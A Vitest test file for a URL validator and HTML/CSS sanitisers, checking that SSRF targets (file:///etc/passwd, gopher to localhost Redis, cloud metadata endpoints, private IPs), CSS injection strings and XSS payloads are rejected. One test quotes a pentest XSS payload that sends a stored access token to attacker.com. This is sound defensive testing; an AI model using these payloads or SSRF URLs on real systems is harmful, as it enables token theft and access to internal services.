import { describe, it, expect, vi, beforeEach } from "vitest";

const { mockResolve4, mockResolve6 } = vi.hoisted(() => ({
  mockResolve4: vi.fn(),
  mockResolve6: vi.fn(),
}));

vi.mock("dns/promises", () => ({
  default: {
    resolve4: mockResolve4,
    resolve6: mockResolve6,
  },
  resolve4: mockResolve4,
  resolve6: mockResolve6,
}));

import {
  validateUserUrl,
  validateUserUrlSync,
  isValidHexColor,
  stripHtmlTags,
} from "../urlValidator";

describe("urlValidator", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockResolve4.mockResolvedValue(["93.184.216.34"]);
    mockResolve6.mockResolvedValue([]);
  });

  describe("validateUserUrl (async with DNS)", () => {
    it("allows valid public HTTP URLs", async () => {
      const result = await validateUserUrl("https://example.com/video.mp4");
      expect(result.valid).toBe(true);
    });

    it("blocks file:// scheme", async () => {
      const result = await validateUserUrl("file:///etc/passwd");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("not allowed");
    });

    it("blocks gopher:// scheme", async () => {
      const result = await validateUserUrl("gopher://localhost:6379/");
      expect(result.valid).toBe(false);
    });

    it("blocks dict:// scheme", async () => {
      const result = await validateUserUrl("dict://localhost/");
      expect(result.valid).toBe(false);
    });

    it("blocks 169.254.169.254 (AWS IMDS)", async () => {
      const result = await validateUserUrl("http://169.254.169.254/latest/meta-data/");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("private/internal");
    });

    it("blocks 169.254.170.2 (ECS metadata)", async () => {
      const result = await validateUserUrl("http://169.254.170.2/v2/credentials/");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("private/internal");
    });

    it("blocks localhost (127.0.0.1)", async () => {
      const result = await validateUserUrl("http://127.0.0.1:3001/health");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("private/internal");
    });

    it("blocks 10.x.x.x private range", async () => {
      const result = await validateUserUrl("http://10.0.11.171/");
      expect(result.valid).toBe(false);
    });

    it("blocks 172.16-31.x.x private range", async () => {
      const result = await validateUserUrl("http://172.16.0.1/");
      expect(result.valid).toBe(false);
    });

    it("blocks 192.168.x.x private range", async () => {
      const result = await validateUserUrl("http://192.168.1.1/");
      expect(result.valid).toBe(false);
    });

    it("blocks hostname that resolves to private IP", async () => {
      mockResolve4.mockResolvedValue(["127.0.0.1"]);
      const result = await validateUserUrl("http://evil.attacker.com/");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("private/internal");
    });

    it("blocks IPv6 loopback ::1", async () => {
      const result = await validateUserUrl("http://[::1]/");
      expect(result.valid).toBe(false);
    });

    it("blocks IPv6-mapped IPv4 private addresses", async () => {
      const result = await validateUserUrl("http://[::ffff:127.0.0.1]/");
      expect(result.valid).toBe(false);
    });

    it("blocks URLs with embedded credentials", async () => {
      const result = await validateUserUrl("http://user:pass@example.com/");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("credentials");
    });

    it("rejects invalid URL format", async () => {
      const result = await validateUserUrl("not a url");
      expect(result.valid).toBe(false);
      expect(result.error).toContain("Invalid URL");
    });

    it("rejects unresolvable hostname", async () => {
      mockResolve4.mockRejectedValue(new Error("ENOTFOUND"));
      mockResolve6.mockRejectedValue(new Error("ENOTFOUND"));
      const result = await validateUserUrl("http://nonexistent.invalid/");
      expect(result.valid).toBe(false);
    });

    it("enforces hostname allowlist when provided", async () => {
      const result = await validateUserUrl("https://evil.com/video.mp4", {
        allowedHostnames: ["s3.amazonaws.com", "cloudfront.net"],
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("allowlist");
    });

    it("allows subdomains in hostname allowlist", async () => {
      const result = await validateUserUrl("https://bucket.s3.amazonaws.com/video.mp4", {
        allowedHostnames: ["s3.amazonaws.com"],
      });
      expect(result.valid).toBe(true);
    });
  });

  describe("validateUserUrlSync (no DNS)", () => {
    it("allows valid public HTTP URLs", () => {
      const result = validateUserUrlSync("https://example.com/video.mp4");
      expect(result.valid).toBe(true);
    });

    it("blocks file:// scheme", () => {
      const result = validateUserUrlSync("file:///etc/passwd");
      expect(result.valid).toBe(false);
    });

    it("blocks private IP literals", () => {
      const result = validateUserUrlSync("http://169.254.169.254/");
      expect(result.valid).toBe(false);
    });

    it("allows hostnames (cannot check DNS synchronously)", () => {
      const result = validateUserUrlSync("http://example.com/");
      expect(result.valid).toBe(true);
    });
  });

  describe("isValidHexColor", () => {
    it("accepts valid 6-digit hex colors", () => {
      expect(isValidHexColor("#FF0000")).toBe(true);
      expect(isValidHexColor("#ffffff")).toBe(true);
      expect(isValidHexColor("#000000")).toBe(true);
      expect(isValidHexColor("#1a2B3c")).toBe(true);
    });

    it("accepts valid 3-digit hex colors", () => {
      expect(isValidHexColor("#F00")).toBe(true);
      expect(isValidHexColor("#fff")).toBe(true);
    });

    it("accepts valid 8-digit hex colors (with alpha)", () => {
      expect(isValidHexColor("#FF000080")).toBe(true);
    });

    it("rejects CSS color names", () => {
      expect(isValidHexColor("red")).toBe(false);
      expect(isValidHexColor("blue")).toBe(false);
    });

    it("rejects CSS injection payloads", () => {
      expect(isValidHexColor("red; } body { background: url(http://evil.com)")).toBe(false);
      expect(isValidHexColor("#000; } .x { color: red")).toBe(false);
    });

    it("rejects empty string", () => {
      expect(isValidHexColor("")).toBe(false);
    });

    it("rejects rgb() syntax", () => {
      expect(isValidHexColor("rgb(255,0,0)")).toBe(false);
    });
  });

  describe("stripHtmlTags", () => {
    it("strips basic HTML tags", () => {
      expect(stripHtmlTags("<b>bold</b>")).toBe("bold");
    });

    it("strips XSS img payload", () => {
      expect(stripHtmlTags('<img src=x onerror=alert(1)>')).toBe("");
    });

    it("strips script tags", () => {
      expect(stripHtmlTags('<script>alert(1)</script>')).toBe("alert(1)");
    });

    it("preserves plain text", () => {
      expect(stripHtmlTags("My Folder Name")).toBe("My Folder Name");
    });

    it("strips nested HTML", () => {
      expect(stripHtmlTags('<div><span>text</span></div>')).toBe("text");
    });

    it("handles the exact XSS payload from the pentest", () => {
      const payload = '<img src=x onerror="fetch(\'https://attacker.com/?t=\'+localStorage.getItem(\'access_token\'))">';
      expect(stripHtmlTags(payload)).toBe("");
    });
  });
});
